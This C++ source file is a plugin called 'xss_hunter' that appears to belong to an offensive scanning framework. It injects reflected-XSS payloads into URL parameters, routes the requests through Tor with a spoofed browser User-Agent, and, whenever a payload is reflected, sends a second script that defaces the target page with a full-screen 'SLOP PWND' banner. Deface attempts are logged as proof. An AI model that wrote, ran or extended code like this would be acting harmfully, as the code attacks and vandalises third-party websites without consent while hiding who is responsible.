#include <spectre/plugin.h>
#include <spectre/tor_proxy.h>
#include <spectre/proof_queue.h>
#include <cpr/cpr.h>
#include <uriparser/Uri.h>
#include <nlohmann/json.hpp>
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <sstream>
#include <cstring>

namespace spectre
{
  class XSSHunter : public Plugin
  {
  public:
    std::string_view name() const override
    {
      return "xss_hunter";
    }

    std::vector<std::string> load_payloads(const std::string& path)
    {
      std::vector<std::string> payloads;
      std::ifstream file(path);
      if (!file.is_open()) {
        std::cerr << "[xss_hunter] Error: Could not open payload file " << path << ". Using basic payloads." << std::endl;
        payloads.push_back("<script>alert('XSS')</script>");
        payloads.push_back("\"><script>alert('XSS')</script>");
        return payloads;
      }

      std::string line;
      while (std::getline(file, line)) {
        if (!line.empty()) {
          payloads.push_back(line);
        }
      }
      file.close();
      return payloads;
    }

    void scan(const nlohmann::json& task) override
    {
      if (!task.contains("target"))
        return;

      std::string url_str = task["target"];
      std::string scan_id = task.value("id", "");
      std::cout << "[xss_hunter] scanning " << url_str << std::endl;
      
      static const std::vector<std::string> payloads = load_payloads("payload/payload.txt");
      if (payloads.empty()) {
          std::cerr << "[xss_hunter] No payloads loaded, aborting scan for " << url_str << std::endl;
          return;
      }
      std::cout << "[xss_hunter] Loaded " << payloads.size() << " payloads." << std::endl;


      UriUriA uri;
      const char *errorPos;
      if (uriParseSingleUriA(&uri, url_str.c_str(), &errorPos) != URI_SUCCESS) {
        uriFreeUriMembersA(&uri);
        return;
      }
      
      if (uri.query.first == nullptr || uri.query.first == uri.query.afterLast) {
        uriFreeUriMembersA(&uri);
        return;
      }

      UriQueryListA *queryList = nullptr;
      int itemCount;
      if (uriDissectQueryMallocA(&queryList, &itemCount, uri.query.first, uri.query.afterLast) != URI_SUCCESS) {
        uriFreeUriMembersA(&uri);
        return;
      }
      
      bool vulnerable = false;

      UriQueryListA *p = queryList;
      while (p) {
        if (vulnerable) break;
        std::string param_name = p->key;

        for (const auto& payload : payloads) {
          std::string test_url = build_test_url(uri, queryList, param_name, payload);
          if (test_url.empty()) continue;

          cpr::Session session;
          session.SetUrl(cpr::Url{test_url});
          session.SetHeader({{"User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"}});
          session.SetTimeout(cpr::Timeout{5000});

          if (TorProxy::get_instance().is_available()) {
            session.SetProxy(cpr::Proxies{{"http", "socks5://127.0.0.1:9050"}, {"https", "socks5://127.0.0.1:9050"}});
          }

          cpr::Response r = session.Get();

          if (r.status_code == 200 && r.text.find(payload) != std::string::npos) {
            std::cout << "[xss_hunter] VULNERABILITY DISCOVERED: Reflected XSS at " << test_url << std::endl;
            std::cout << "[xss_hunter] Payload: " << payload << std::endl;
            
            VulnProof proof;
            proof.id = scan_id;
            proof.target = url_str;
            proof.vuln_type = "xss_hunter";
            proof.evidence["description"] = "Reflected XSS detected. A malicious payload was injected into a URL parameter and reflected in the server's response.";
            proof.evidence["payload"] = payload;
            proof.evidence["test_url"] = test_url;
            
            std::string deface_payload = R"(<script>document.body.innerHTML = '<div style=\"background-color:black;color:red;font-size:72px;text-align:center;position:fixed;top:0;left:0;width:100%;height:100%;display:flex;justify-content:center;align-items:center;\">SLOP PWND</div>';</script>)";
            std::string deface_url = build_test_url(uri, queryList, param_name, deface_payload);

            cpr::Session deface_session;
            deface_session.SetUrl(cpr::Url{deface_url});
            deface_session.SetHeader({{"User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"}});
             if (TorProxy::get_instance().is_available()) {
              deface_session.SetProxy(cpr::Proxies{{"http", "socks5://127.0.0.1:9050"}, {"https", "socks5://127.0.0.1:9050"}});
            }
            deface_session.Get();
            
            proof.evidence["deface_attempted"] = "true";
            
            enqueue_proof(proof);
            vulnerable = true;
            break; 
          }
        }
        p = p->next;
      }
      
      uriFreeQueryListA(queryList);
      uriFreeUriMembersA(&uri);
    }

  private:
    std::string build_test_url(const UriUriA& base_uri, UriQueryListA* query_list, const std::string& param_to_replace, const std::string& payload)
    {
        std::stringstream url_builder;
        
        url_builder << std::string(base_uri.scheme.first, base_uri.scheme.afterLast) << "://";
        url_builder << std::string(base_uri.hostText.first, base_uri.hostText.afterLast);
        if (base_uri.portText.first)
          url_builder << ":" << std::string(base_uri.portText.first, base_uri.portText.afterLast);

        std::string path_str;
        for (UriPathSegmentA* p = base_uri.pathHead; p; p = p->next) {
            path_str += "/";
            path_str += std::string(p->text.first, p->text.afterLast);
        }
        if (path_str.empty()) {
            path_str = "/";
        }
        url_builder << path_str;

        std::stringstream query_builder;
        bool first_param = true;
        for (UriQueryListA* current = query_list; current; current = current->next) {
            if (!first_param) {
                query_builder << "&";
            }
            first_param = false;

            char *escapedKey = uriEscapeA(current->key, current->key + strlen(current->key), false, false);
            if(escapedKey) {
                query_builder << escapedKey;
                free(escapedKey);
            }

            if (current->value) {
                query_builder << "=";
                std::string value_to_encode;
                if (std::string(current->key) == param_to_replace) {
                    value_to_encode = payload;
                } else {
                    value_to_encode = current->value;
                }
                char* escapedValue = uriEscapeA(value_to_encode.c_str(), value_to_encode.c_str() + value_to_encode.length(), false, false);
                if(escapedValue) {
                    query_builder << escapedValue;
                    free(escapedValue);
                }
            }
        }
        
        std::string query_string = query_builder.str();
        if (!query_string.empty()) {
            url_builder << "?" << query_string;
        }

        return url_builder.str();
    }
  };
} 

extern "C" std::unique_ptr<spectre::Plugin> spectre_create_plugin()
{
  return std::make_unique<spectre::XSSHunter>();
} 